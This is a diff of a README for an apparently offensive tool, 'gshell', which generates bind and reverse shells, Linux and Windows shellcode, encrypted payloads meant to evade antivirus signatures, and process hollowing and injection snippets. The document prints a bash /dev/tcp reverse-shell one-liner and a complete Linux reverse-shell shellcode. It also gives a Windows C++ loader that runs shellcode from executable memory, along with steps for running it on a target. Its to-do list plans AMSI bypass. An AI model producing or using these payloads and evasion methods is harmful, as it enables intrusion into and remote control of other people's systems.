@@ -31,10 +31,35 @@ Supports the following encodings (as of now):
 - Base64/32/16 Encodings: Bypass string/keyword filters
 - PowerShell Base64 Encoding
 
+Supports the following obfuscation methods:
+- IP to Hex
+- IP to Octal
+- Port to Hex
+- Port to Octal
+
+Supports the following shellcodes:
+- Windows Bind Shells
+- Windows Reverse Shells
+- Linux Bind Shells
+- Linux Reverse Shells
+
+Supports the following crypters:
+- XOR
+- AES
+- DES
+- 3DES
+- RC2
+
+**Note: Shellcode encryption may be useful in evading static antivirus signatures.**
+
+Supports code snippets:
+- Process Hollowing
+- Process Injector
+
 Supports the follow IP versions:
 
-- IPv4
-- IPv6
+- IPv4: For payload types, code snippets types, and shellcode types.
+- IPv6: For payload types and code snippets types.
 
 Supported protocols:
 
@@ -109,9 +134,9 @@ bash -i >& /dev/tcp/$ip/$port 0>&1
 This is the help menu:
 
 ```powershell
-PS C:\gshell> python .\gshell.py -h
-usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--windows] [--linux] [--base64]
-                 [--base32] [--base16] [--url] [--obfuscate] [--xor] [--aes] [--des] [--rc2] [--caesar] [--no-block] [--list] [--advice] [-h]
+PS C:\gshell> python .\gshell.py
+usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--windows] [--linux] [--base64] [--base32]
+                 [--base16] [--url] [--obfuscate] [--xor] [--aes] [--des] [--tdes] [--rc2] [--no-block] [--list] [--advice] [-h]
 
  ██████  ███████ ██   ██ ███████ ██      ██      
 ██       ██      ██   ██ ██      ██      ██      
@@ -121,7 +146,7 @@ usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b
 
 Generate shellcodes, bind shells and/or reverse shells with style
 
-            Version: 1.3 dev
+            Version: 1.3.1 dev
             Author: nozerobit
             Twitter: @nozerobit
 
@@ -155,14 +180,14 @@ Encoding Options:
   --url                 Add URL encoding to payload types
 
 Obfuscation Options:
-  --obfuscate           Obfuscate payload types
+  --obfuscate           Obfuscates the IP address and port number for payload types
 
 Encryptor Options:
   --xor                 XOR encrypt shellcode types
   --aes                 AES encrypt shellcode types
   --des                 DES encrypt shellcode types
+  --tdes                3DES encrypt shellcode types
   --rc2                 RC2 encrypt shellcode types
-  --caesar              Caesar encrypt shellcode types
 
 Markdown Options:
   --no-block            Skip ```
@@ -270,9 +295,9 @@ bash+-i+%3E%26+%2Fdev%2Fudp%2F192.168.111.120%2F443+0%3E%261
 
 ```
 
-## Example of Shellcodes
+## Example of Linux Shellcodes
 
-Here is an example of a shellcode:
+Here is an example of a linux shellcode:
 
 ```sh
 PS C:\gshell> python .\gshell.py -i 192.168.220.131 -p 4433 --shellcode --srev --linux
@@ -283,7 +308,7 @@ PS C:\gshell> python .\gshell.py -i 192.168.220.131 -p 4433 --shellcode --srev -
 \x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x1\x1\x1\x1\xbb\xc1\xa9\xdd\x82\x31\xc3\x53\x66\x68\x11\x51\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
 ```
 
-We could use the generate shellcode in another program or script:
+We could use the generated shellcode in another program or script:
 
 ```c
 #include <stdio.h>
@@ -317,6 +342,48 @@ Run the `example` program on the target to receive the reverse shell:
 
 ```sh
 chmod +x ./example && ./example
+```
+
+## Example of Windows Shellcodes
+
+Here is an example of a linux shellcode:
+
+```powershell
+PS C:\gshell> python .\gshell.py -i 192.168.220.131 -p 4433 --shellcode --srev --windows
+```
+
+We could use the generated shellcode in another program or script:
+
+```cpp
+#include <windows.h>
+#include <iostream>
+#include <stdlib.h>
+#include <stdio.h>
+
+int main() {
+    char shellcode[] = {"\x56\x48\x8B\xF4\x48\x83\xE4\xF0\x48\x83\xEC\x20\xE8\x05\x00........."
+    };
+    int shellcode_size = sizeof(shellcode);
+    LPVOID exec_mem;
+
+    exec_mem = VirtualAlloc(
+        0,
+        shellcode_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+        );
+
+    RtlMoveMemory(exec_mem, shellcode, shellcode_size);
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+    Sleep(1000000);
+    return 0;
+}
+```
+
+Then compile the program and execute it:
+
+```powershell
+.\example.exe
 ```
 
 # Installation in Linux
@@ -388,6 +455,13 @@ Change to the project directory:
 cd C:\Tools
 ```
 
+If you want to use this tool from any directory in your system, you can add the `gshell` project folder to the `%PATH%` environment variable using PowerShell as seen [here](https://stackoverflow.com/a/2571200):
+
+```powershell
+[Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Tools", "Machine")
+[Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Tools", "User")
+```
+
 Execute the tool:
 
 ```powershell
@@ -412,12 +486,15 @@ This project was heavily inspired by these other projects so I would like to giv
 
 - [markdown-code-runner (fork)](https://github.com/iesahin/markdown-code-runner)
 - [OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)
+- [masm_shc](https://github.com/hasherezade/masm_shc)
 
 # ToDo
 
 The version 2.0 should have the following:
 
-[ ] Encryptors: To bypass AVs
-[ ] Obfuscators: To bypass AVs
-[ ] Anti-AMSI: To bypass AMSI
-[ ] Add Windows Shellcode
+1. Anti-AMSI: To bypass AMSI
+2. Add a file selector for payloads, shellcodes, and snippets.
+3. Add shellcode formats (C, Python, Ruby, etc formats)
+4. Add more obfuscation methods
+5. Optimize Windows shellcodes and write more shellcodes in Assembly (reduce payload size from 11560 to 550 or less)
+6. Add Linux x64 bit shellcodes, right now there are only 32-bit
